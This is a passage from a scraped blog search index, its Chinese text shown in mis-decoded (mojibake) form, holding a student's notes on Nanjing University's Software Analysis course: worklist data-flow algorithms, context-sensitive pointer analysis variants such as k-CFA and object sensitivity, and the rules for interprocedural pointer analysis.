å®é™…åˆ†æä¸­å…¶å®æ˜¯ä¸ä¼šç”¨è¿­ä»£ç®—æ³•çš„ï¼Œworklist algorithm æ˜¯å¯¹è¿­ä»£ç®—æ³•çš„ä¼˜åŒ–ã€‚ ä¼˜åŒ–ç‚¹ï¼šè¿­ä»£ç®—æ³•ä¸­åªè¦æœ‰ä¸€ä¸ª node çš„ out å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šé‡æ–°è®¡ç®—å…¨éƒ¨çš„ note çš„ outï¼Œä½†æ˜¯å…¶å®æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†çš„ node çš„ out å·²ç»è¾¾åˆ°ä¸åŠ¨ç‚¹ï¼Œæ‰€ä»¥ worklist ç®—æ³•çš„ä¼˜åŒ–å°±æ˜¯å°† out å‘ç”Ÿå˜åŒ–çš„ node çš„åç»§ node æ”¾å…¥ worklistï¼Œç®—æ³•æ¯æ¬¡åªè®¡ç®— worklist æ•°ç»„ä¸­çš„ node çš„ outã€‚ æ€»ç»“ æœ€åæˆ‘ä»¬æ¥æ¢³ç†ä¸€éç¬¬å…­èŠ‚è¯¾çš„å†…å®¹ã€‚\né¦–å…ˆæˆ‘ä»¬æƒ³è¦çŸ¥é“æˆ‘ä»¬çš„è¿­ä»£ç®—æ³•æ˜¯å¦å¯ä»¥è¾¾åˆ°ä¸åŠ¨ç‚¹ï¼Œå¹¶ä¸”è¾¾åˆ°çš„ä¸åŠ¨ç‚¹æ˜¯ä¸æ˜¯æœ€ä¼˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—çœ‹è¿­ä»£ç®—æ³•æ˜¯å¦æ»¡è¶³ä¸åŠ¨ç‚¹å®šç†çš„æ¡ä»¶ æœ‰é™ å•è°ƒ æ¥ä¸‹æ¥æˆ‘ä»¬è®¨è®ºäº†è¿­ä»£ç®—æ³•çš„å¤æ‚åº¦ï¼ŒçŸ¥é“äº†æœ€åçš„è¿­ä»£æ¬¡æ•° ç„¶åæˆ‘ä»¬ä» lattice çš„è§’åº¦é‡æ–°å®¡è§†äº† may å’Œ must åˆ†æï¼Œè¿™é‡Œçš„ä¸¤ä¸ªå›¾éå¸¸ç›´è§‚æ˜äº†ã€‚ æ¥ç€æˆ‘ä»¬ç”¨ MOP æ¥è¡¡é‡äº†ä¸€ä¸‹è¿­ä»£ç®—æ³•çš„ç²¾åº¦ æŒ‡å‡ºäº†æ»¡è¶³åˆ†é…å¾‹çš„è½¬ç§»å‡½æ•°çš„ç®—æ³•çš„ç²¾åº¦å’Œ MOP ä¸€æ · åŒæ—¶ä¹Ÿä»‹ç»äº†ä¸€ç§ä¸æ»¡è¶³åˆ†é…å¾‹çš„åˆ†æ æœ€åç»™å‡ºäº†è¿­ä»£ç®—æ³•çš„ä¼˜åŒ–ã€‚ ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AD%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"è§†é¢‘ï¼š å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹ 06ï¼ˆData Flow Analysis - Foundations II è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) è½¯ä»¶åˆ†æâ€”â€”æ•°æ®æµåˆ†æ2_zc","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬å…­èŠ‚ç¬”è®°"},{"content":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹10ï¼ˆPointer Analysis - Foundations IIï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼šã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹8â€”â€”æŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆè¯¾æ—¶11/12ï¼‰ - ç®€ä¹¦ (jianshu.com) (34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ PPTï¼šPointer Analysis: Context Sensitivity (nju.edu.cn) ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿå¸¦æ¥çš„é—®é¢˜ å¯¹äºä¸Šè¿°è¿™æ®µä»£ç ï¼Œå½“æˆ‘ä»¬ä¸è€ƒè™‘ä¸Šä¸‹æ–‡å»å¤„ç†ç¬¬ 5ã€6 è¡Œçš„ id å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œid çš„å‚æ•°å’Œè¿”å›å€¼ä¼šå’Œä¸¤æ¬¡è°ƒç”¨çš„å‚æ•°å’Œè¿”å›å€¼æ‚ç³…åœ¨ä¸€èµ·ï¼Œè¿™æ ·å‡å¦‚åœ¨è¿›è¡Œå¸¸é‡ä¼ æ’­çš„æ—¶å€™ï¼Œå˜é‡ i å°±ä¼šè¢«åˆ†æä¸º NACï¼Œè¿™æ˜¯ä¸å¯¹çš„ã€‚æ‰€ä»¥è¦å¯¹å‡½æ•°è°ƒç”¨æ·»åŠ ä¸Šä¸‹æ–‡ï¼Œè¿™æ ·å»åˆ†æç¬¬ 7 è¡Œçš„æ—¶å€™ get æŒ‡å‘çš„å°±åªæœ‰å¯¹è±¡ One é‡Œé¢çš„ get å‡½æ•°\nIntroduction btw ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„è‹±æ–‡æ˜¯ contex insensitivityï¼Œç¼©å†™æ˜¯ C.I. ä¸Šä¸‹æ–‡æ•æ„Ÿçš„è‹±æ–‡æ˜¯ contex sensitivityï¼Œç¼©å†™æ˜¯ C.S.\nç›®å‰ oldest å’Œ best-know çš„ä¸Šä¸‹æ–‡æ•æ„Ÿç­–ç•¥æ˜¯ call-site sensitivityï¼ˆcall-stringï¼‰ ä½¿ç”¨ call site é“¾æ¥è¡¨ç¤ºæ¯ä¸ªæ–¹æ³•çš„ä¸Šä¸‹æ–‡ï¼ˆéé‡ç‚¹ï¼‰ cloning-based ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆæœ€ç›´è§‚çš„æ–¹æ³•å»å®ç°ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰ã€ æ¯ä¸ªä¸Šä¸‹æ–‡å°±ä¼šå¯¹å˜é‡å’Œæ–¹æ³•è¿›è¡Œä¸€æ¬¡å…‹éš† ä¸Šä¸‹æ–‡æ•æ„Ÿçš„å † OO ç¨‹åºæ˜¯å…¸å‹çš„å †æ•æ„Ÿï¼Œå› ä¸ºç¨‹åºä¼šé¢‘ç¹çš„ä¿®æ”¹å †ï¼Œæ‰€ä»¥ä¹Ÿè¦å¯¹å †æŠ½è±¡æ·»åŠ ä¸Šä¸‹æ–‡\nè€å¸ˆåœ¨è¿™é‡Œè¿›è¡Œä¸¾ä¾‹è¡¨ç¤ºä¸Šä¸‹æ–‡æ•æ„Ÿå’Œå †çš„ä¸Šä¸‹æ–‡æ•æ„Ÿç¼ºä¸€ä¸å¯\nä¸è€ƒè™‘å †çš„ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œåªè€ƒè™‘åˆ†æçš„ä¸Šä¸‹æ–‡æ•æ„Ÿ\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è™½ç„¶åˆ†æçš„æ—¶å€™è€ƒè™‘äº†ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œä½†æ˜¯å½“è°ƒç”¨æ–¹æ³•ä¸­å­˜åœ¨ new è¯­å¥çš„æ—¶å€™ ï¼ˆå †æ“ä½œï¼‰ï¼Œä¸è€ƒè™‘å †çš„ C.S.å°±ä¼šåƒå·¦å›¾ä¸€æ · è€ƒè™‘å †çš„ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œä¸è€ƒè™‘åˆ†æçš„ä¸Šä¸‹æ–‡æ•æ„Ÿ\nå½“åˆ†æçš„æ—¶å€™ä¸è€ƒè™‘ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œåªè€ƒè™‘å¯¹çš„ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå¦‚å·¦å›¾æ‰€ç¤ºï¼Œåœ¨å˜é‡ p å¤„å°±å‡ºç°äº†é”™è¯¯ï¼Œéšåå¯¼è‡´ o_8. f æŒ‡å‘ o 1 å’Œ o 2ï¼Œå³ä½¿å †ä¸Šä¸‹æ–‡æ•æ„Ÿä¹Ÿæ²¡ç”¨ã€‚ Context Sensitive Pointer Analysisï¼šRules å°±æ˜¯åœ¨ä¹‹å‰çš„è§„åˆ™ä¸Šé¢å¢åŠ äº†æ ‡è®°\næ ¹æ®è°ƒç”¨è€…çš„è¡Œæ•°æ¥åŒºåˆ†ä¸åŒä¸Šä¸‹æ–‡ï¼Œåªè¦åŒºåˆ†äº†å‡½æ•°ã€å˜é‡ã€å †å¯¹è±¡ï¼Œå°±èƒ½å¤ŸåŒºåˆ†å®ä¾‹åŸŸã€ä¸Šä¸‹æ–‡æ•æ„Ÿçš„æŒ‡é’ˆï¼ˆå˜é‡+å¯¹è±¡åŸŸï¼‰ã€‚ Cï¼šä¸Šä¸‹æ–‡ï¼ˆæš‚æ—¶ç”¨è°ƒç”¨ç‚¹çš„è¡Œæ•°è¡¨ç¤ºï¼‰ï¼ŒOï¼šå¯¹è±¡ï¼ŒFï¼šå¯¹è±¡ä¸­çš„åŸŸã€‚ Call è§„åˆ™æœ‰æ‰€æ”¹å˜ select (c, l, c\u0026rsquo;: oi, m)æ ¹æ®è°ƒç”¨æ—¶çš„ä¿¡æ¯æ¥ç»™è°ƒç”¨ç›®æ ‡å‡½æ•°é€‰æ‹©ä¸Šä¸‹æ–‡ï¼ˆc æ˜¯è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ï¼Œl æ˜¯è°ƒç”¨è€…çš„è¡Œå·ï¼Œc\u0026rsquo;: oi æ˜¯ x å¯¹è±¡çš„æŒ‡å‘é›†åˆï¼Œm æ˜¯ç›®æ ‡å‡½æ•°ï¼‰ï¼Œct è¡¨ç¤ºç›®æ ‡å‡½æ•°çš„ä¸Šä¸‹æ–‡ï¼ˆåé¢ä¼šå°†å¦‚ä½• Select å¦‚ä½•é€‰æ‹©ä¸Šä¸‹æ–‡ï¼‰ã€‚c æ˜¯å¯ä»¥ç´¯ç§¯çš„ï¼Œä¸€è¿ä¸²çš„è°ƒç”¨ï¼Œä¸Šä¸‹æ–‡å°†ç”¨ä¸€è¿ä¸²çš„è¡Œæ•°æ¥è¡¨ç¤ºã€‚ ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82pointer-analysis-context-sensitivity-i/","summary":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹10ï¼ˆPointer Analysis - Foundations IIï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼šã€è¯¾ç¨‹ç¬”è®°","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬åä¸€èŠ‚â€”â€”Pointer Analysis - Context Sensitivity I"},{"content":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹13ï¼ˆStatic Analysis for Securityï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼šã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹9â€”â€”æ±¡ç‚¹åˆ†æï¼ˆè¯¾æ—¶13ï¼‰ - ç®€ä¹¦ (jianshu.com) (34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ PPTï¼šStatic Analysis for Security (nju.edu.cn) æ²¡ä»€ä¹ˆæ–°ä¸œè¥¿ï¼Œæ‡’å¾—å†™ç¬”è®°äº†ã€‚\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%89%E8%8A%82static-analysis-for-security/","summary":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹13ï¼ˆStatic Analysis for Securityï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼šã€","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬åä¸‰èŠ‚â€”â€”Static Analysis for Security"},{"content":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹10ï¼ˆPointer Analysis - Foundations IIï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼šã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹8â€”â€”æŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆè¯¾æ—¶11/12ï¼‰ - ç®€ä¹¦ (jianshu.com) (34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ PPTï¼šPointer Analysis: Context Sensitivity (nju.edu.cn) æœ¬èŠ‚è®²ä¸Šä¸‹æ–‡æ•æ„Ÿçš„è¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æçš„ç®—æ³• Context Sensitive Pointer Analysisï¼šAlgorithms C.S.å’Œ C.I.çš„ç®—æ³•æœ¬è´¨ä¸Šæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æŠŠå¯¹è±¡ã€å˜é‡å‰åŠ äº†ä¸Šä¸‹æ–‡çš„æ ‡è¯† å”¯ä¸€çš„åŒºåˆ«åœ¨äº ProcessCall ä¸­æ·»åŠ äº† select æ–¹æ³•æ¥æ‰¾åˆ°ç›®æ ‡å‡½æ•° m çš„ä¸Šä¸‹æ–‡æ ‡è¯†ã€‚ select æ–¹æ³•çš„ç»†èŠ‚åœ¨åé¢è¯¦ç»†è®²ã€‚\nContext Sensitivity Variants ä¸Šä¸‹æ–‡çš„ç”Ÿæˆä¸»è¦æœ‰ä¸‰ç§ç­–ç•¥ï¼š\ncall-site sensitivity object sensitivity type sensitivity call-site sensitivity call-site sensitivity çš„ç­–ç•¥å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå°±æ˜¯åœ¨åŸæ¥ä¸Šä¸‹æ–‡é“¾çš„åŸºç¡€ä¸Šï¼ŒæŠŠè°ƒç”¨ç‚¹å¤„çš„ä¸Šä¸‹æ–‡åŠ ä¸Šå»ã€‚ ä¸‹å›¾æ˜¯ä¾‹å­ã€‚ä½†æ˜¯è¿™æ ·çš„åˆ†æç­–ç•¥å¸¦æ¥äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å›¾ä¸­ 15 è¡Œï¼Œbar æ–¹æ³•å†…åˆè°ƒç”¨è‡ªå·±ï¼Œé‚£ä¹ˆè¿™æ ·åˆ†æå°±ä¸ä¼šç»ˆæ­¢ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ— ç©·æ— å°½çš„ä¸Šä¸‹æ–‡é“¾ã€‚å¹¶ä¸”åœ¨å®é™…åˆ†æç¨‹åºä¸­ï¼Œå³ä½¿æ²¡æœ‰æƒ³å›¾ä¸­è¿™æ ·çš„æƒ…å†µï¼Œä½†æ˜¯å› ä¸ºç¨‹åºæœ¬èº«å°±å¾ˆå¤æ‚ï¼Œç”Ÿæˆçš„ä¸Šä¸‹æ–‡é“¾ä¹Ÿä¼šå¾ˆé•¿ï¼Œè¿™æ ·å°±ä¼šå½±å“åˆ†ææ€§èƒ½ã€‚ æ‰€ä»¥ï¼Œcall-site sensitivity è®¾å®šäº†ä¸Šä¸‹æ–‡é“¾çš„é•¿åº¦æœ€é•¿ä¸º kï¼Œå› æ­¤å®ƒåˆè¢«ç§°ä¸º k-CFAã€‚ è®¾ç½®äº†é•¿åº¦é™åˆ¶å¯ä»¥\nç¡®ä¿æŒ‡é’ˆåˆ†æç®—æ³•çš„ç»ˆæ­¢ é¿å…åœ¨å®é™…åˆ†æä¸­ç”Ÿæˆè¿‡é•¿çš„ä¸Šä¸‹æ–‡é“¾ å…·ä½“çš„æ“ä½œå°±æ˜¯å¯¹äºç”Ÿæˆçš„ä¸Šä¸‹æ–‡é“¾ï¼Œå¦‚æœé•¿åº¦å¤§äº kï¼Œé‚£ä¹ˆå°±åªä¿ç•™æœ€å k ä¸ªä¸Šä¸‹æ–‡ã€‚ï¼ˆåœ¨å®é™…åˆ†æä¸­ï¼Œk é€šå¸¸å°äºç­‰äº 3ï¼Œå¹¶ä¸”åœ¨å‡½æ•°çš„ä¸Šä¸‹æ–‡é€šå¸¸å–2ï¼Œå †ä¸Šä¸‹æ–‡é€šå¸¸å–1 çš„æ—¶å€™æ•ˆæœæ¯”è¾ƒå¥½ï¼‰ è¿™é‡Œè€å¸ˆä¸¾äº†ä¸ªä¾‹å­ï¼Œè¿˜æ˜¯æŒºç»•çš„ï¼Œå»ºè®®å»çœ‹çœ‹è§†é¢‘\nobject sensitivity åŸºäºå¯¹è±¡çš„ä¸Šä¸‹æ–‡æ•æ„Ÿå°±æ˜¯ä¸é€‚ç”¨è¡Œå·ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œè€Œæ˜¯ç”¨ receive object ä½œä¸ºä¸Šä¸‹æ–‡æ•æ„Ÿé“¾ã€‚ ä¸¾ä¾‹ï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œ1-object çš„ object sensitivityã€‚è¿™æ ·çš„ä¼˜åŠ¿æ˜¯ä»€ä¹ˆå‘¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š call-site çš„ sensitivity åœ¨ 12 è¡Œå¤„æ±‡èšäº† 5 å’Œ 6 è¡Œè°ƒç”¨ç‚¹çš„æ•°æ®æµï¼Œå‡ºç°äº†é”™è¯¯ã€‚ä½†æ˜¯ç”¨ 2-call-site çš„ call-site sensitivity å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ ä½†å…¶å® call-site ä¸Šä¸‹æ–‡æ•æ„Ÿå’Œ object ä¸Šä¸‹æ–‡æ•æ„ŸåŠæ–¤å…«ä¸¤ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º ç†è®ºä¸Šä»–ä»¬ä¸¤ä¸ªæ²¡å•¥å¯æ¯”æ€§ï¼Œä½†æ˜¯åœ¨å®è·µä¸­å¯¹äº OO è¯­è¨€ï¼Œobject sensitivity æ— è®ºæ˜¯ç²¾å‡†åº¦è¿˜æ˜¯æ€§èƒ½éƒ½ä¼˜äº call-site sensitivity æœ€åè€å¸ˆè¿˜è®²äº†ä¸€ä¸ªç±»å‹ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ŒåŸºäºåˆ›å»ºç‚¹æ‰€åœ¨çš„ç±»å‹ï¼Œæ˜¯åŸºäºå¯¹è±¡æ•æ„Ÿç²—ç²’åº¦çš„æŠ½è±¡ï¼Œç²¾åº¦è¾ƒä½ã€‚æ˜¯å¯¹ object sensitivity çš„æŠ½è±¡ï¼Œç²¾åº¦è¦å¼±äº objectã€‚\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%8A%82pointer-analysis-context-sensitivity-ii/","summary":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹10ï¼ˆPointer Analysis - Foundations IIï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼šã€è¯¾ç¨‹ç¬”è®°","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬åäºŒèŠ‚â€”â€”Pointer Analysis - Context Sensitivity II"},{"content":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹10ï¼ˆPointer Analysis - Foundations IIï¼‰å“”å“©å“”å“©_bilibili PPTï¼š https://cs.nju.edu.cn/tiantan/software-analysis/PTA-FD.pdf ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹7â€”â€”æŒ‡é’ˆåˆ†æåŸºç¡€ï¼ˆè¯¾æ—¶9/10ï¼‰ - ç®€ä¹¦ (jianshu.com) ä¹¦æ¥ä¸Šå›\næŒ‡é’ˆåˆ†æå¦‚ä½•å¤„ç†å‡½æ•°è°ƒç”¨ è€å¸ˆå†æ¬¡æåŠäº† CHA ç®—æ³•çš„ç¼ºé™·ï¼ŒCHA æ˜¯åŸºäºå£°æ˜ç±»å‹ï¼Œæ‰€ä»¥ä¸ç²¾å‡†ï¼Œå¯èƒ½ä¼šå¼•å…¥å†—ä½™çš„è°ƒç”¨è¾¹å’ŒæŒ‡é’ˆå…³ç³»ã€‚\nå› ä¸ºå£°æ˜ç±»å‹å¯èƒ½æ˜¯çˆ¶ç±»ï¼Œè€Œå®ä¾‹åŒ–çš„å®é™…æ˜¯ä¸ªå­ç±»ï¼Œå½“å˜é‡è°ƒç”¨å­ç±»æ–¹æ³•çš„æ—¶å€™ï¼ŒCHA åˆ†æçš„æ—¶å€™ä¼šå°†çˆ¶ç±»çš„æ‰€æœ‰å­ç±»éƒ½çº³å…¥å˜é‡çš„æŒ‡å‘å…³ç³»ï¼Œè¿™æ ·å°±å¤šäº†å¾ˆå¤šå®é™…æ²¡æœ‰çš„è°ƒç”¨è¾¹å’ŒæŒ‡é’ˆå…³ç³» æ‰€ä»¥ç›¸å¯¹äº CHAï¼ŒåŸºäº pt (a)çš„æŒ‡é’ˆåˆ†æè¦æ›´åŠ ç²¾å‡†ï¼Œä»¥è¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æå’Œ CG æ„é€ åŒæ—¶è¿›è¡Œï¼ŒåŠ¨æ€çš„å»ä¼ æ’­å’Œæ·»åŠ æŒ‡å‘å…³ç³»ï¼Œè¿™æ ·æ„æˆçš„è°ƒç”¨å›¾å°±æ²¡æœ‰å†—ä½™è¾¹äº†ã€‚\nè°ƒç”¨è¯­å¥è§„åˆ™ æ¦‚æ‹¬æ¥è¯´å°±æ˜¯å››æ­¥èµ°\ndispatch æ¥æ‰¾åˆ°æ–¹æ³• k æ˜¯åˆ°åº•æ˜¯å“ªä¸ªå‡½æ•° ä¼  receiver objectï¼ˆç¬¬å››è¡Œï¼‰ï¼šæŠŠ x æŒ‡å‘çš„å¯¹è±¡ oiï¼ˆå°±æ˜¯ç¬¬ä¸€è¡Œçš„ pt (x)ï¼‰ä¼ å…¥ m å‡½æ•°çš„ this å˜é‡ ä¼ å‚æ•° ï¼ˆç¬¬äºŒè¡Œå’Œç¬¬äº”è¡Œï¼‰ï¼šæŠŠæ¯ä¸ªå‚æ•°æŒ‡å‘çš„å¯¹è±¡ ou ä¼ ç»™å‡½æ•° m çš„å‚æ•°ï¼Œmpj æ„æ€æ˜¯ m çš„ç¬¬ j ä¸ªå‚æ•°ï¼ŒåŒæ—¶å»ºç«‹ PFG è¾¹ ä¼ è¿”å›å€¼ï¼ˆç¬¬ä¸‰è¡Œå’Œç¬¬å…­è¡Œï¼‰ï¼špt (mret)ä¼ ç»™ pt (r)ï¼ŒåŒæ—¶å»ºç«‹ PFG è¾¹ é—®é¢˜ï¼šä¸ºä»€ä¹ˆ PFG ä¸­ä¸æ·»åŠ  x-\u0026gt;mthis è¾¹ï¼Ÿæ­¤æ—¶çš„ x æŒ‡å‘çš„é‚£äº› oi å’Œ m å…·æœ‰ç›¸åŒçš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥æµå‘ mthisï¼Œä½†æ˜¯ PFG æ˜¯åŠ¨æ€æ„å»ºçš„ï¼Œä¹‹å x å¯èƒ½æŒ‡å‘äº†å’Œ m ä¸æ˜¯åŒä¸€ç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆæ­¤æ—¶å°†è¿™äº›å¯¹è±¡æµå‘ mthis æ˜¯ä¸å¯¹çš„ã€‚\nè¿‡ç¨‹é—´ PTA ç®—æ³• ï¼ˆæ ‡é»„è‰²çš„åœ°æ–¹æ˜¯å’Œè¿‡ç¨‹å†…åˆ†æä¸åŒçš„åœ°æ–¹ï¼‰ ç¬¦å·è§£é‡Š\nmentryï¼šå…¥å£ main å‡½æ•° Smï¼šå‡½æ•°mä¸­çš„è¯­å¥ Sï¼šå¯è¾¾è¯­å¥çš„é›†åˆï¼ˆå°±æ˜¯RMä¸­çš„è¯­å¥ï¼‰ RMï¼šå¯è¾¾å‡½æ•°çš„é›†åˆ CGï¼šè°ƒç”¨å›¾çš„è¾¹ æ­¥éª¤\nä»å…¥å£å‡½æ•°å¼€å§‹ï¼Œé¦–å…ˆ addreachable m_entry AddReachable () å°†å‡½æ•°æˆ–å¯¹è±¡åŠ å…¥é›†åˆ RM è¡¨ç¤ºè¯¥å‡½æ•°æˆ–å¯¹è±¡å·²å¯è¾¾ ç„¶åå°† m çš„è¯­å¥å¹¶å…¥é›†åˆ s ä¸­ï¼Œè¡¨ç¤º m ä¸­çš„è¯­å¥éƒ½å·²å¯è¾¾ å¤„ç† sm ä¸­çš„ NEW è¯­å¥ï¼šå°†æŒ‡å‘å…³ç³»\u0026lt;xi, {o_i}\u0026gt;åŠ å…¥ WL ç­‰å¾…å¤„ç†é›†åˆ å¤„ç† sm ä¸­çš„ assign è¯­å¥ï¼šå‘ PFG ä¸­æ·»åŠ è¾¹ å¤„ç† WL é›†åˆ å–å‡ºä¸€ä¸ªå¾…ä¼ æ’­çš„æŒ‡å‘å…³ç³»\u0026lt;n, pts\u0026gt; å»é™¤ pts ä¸­çš„ pt (n)é¿å…é‡å¤ä¼ æ’­ å°† $\\Delta$ ä¼ æ’­åˆ° n çš„æŒ‡å‘é›†åˆä¸­ å¦‚æœ n è¡¨ç¤ºä¸€ä¸ªå˜é‡ xï¼Œå¹¶ä¸”å­˜åœ¨ load å’Œ store è¯­å¥ï¼Œå°±å¯¹ $\\Delta$ ä¸­çš„æ¯ä¸ª o_i è¿›è¡Œ addedge å¦‚æœ n è¡¨ç¤ºä¸€ä¸ªå˜é‡ xï¼Œåˆ™å¯¹ $\\Delta$ ä¸­çš„æ¯ä¸ª o_i å’Œ x è¿›è¡Œ ProcessCall æ“ä½œ ProcessCall ç”¨äºå¤„ç†å˜é‡ x å¯¹å‡½æ•°çš„è°ƒç”¨æ“ä½œï¼ˆå°±æ˜¯æœ¬èŠ‚ä¸€å¼€å§‹è¯´çš„ CALL è¯­å¥ï¼‰ ä» S è¯­å¥é›†åˆä¸­å˜é‡ x çš„è°ƒç”¨è¯­å¥ Lï¼ˆè°ƒç”¨çš„å‡½æ•°ç”¨ k è¡¨ç¤ºï¼‰ ç”¨ dispatch å»æ±‚è§£å‡½æ•° k åˆ°åº•æ˜¯è°ƒç”¨çš„å“ªä¸ªå¯¹è±¡çš„å“ªä¸ªå‡½æ•°ï¼Œç»“æœç”¨ m è¡¨ç¤ºï¼Œç„¶åæŠŠå¾…ä¼ æ’­çš„æŒ‡å‘å…³ç³»\u0026lt;m_this, {o_i}\u0026gt;åŠ å…¥ WL å¦‚æœè¯­å¥ L åˆ° m 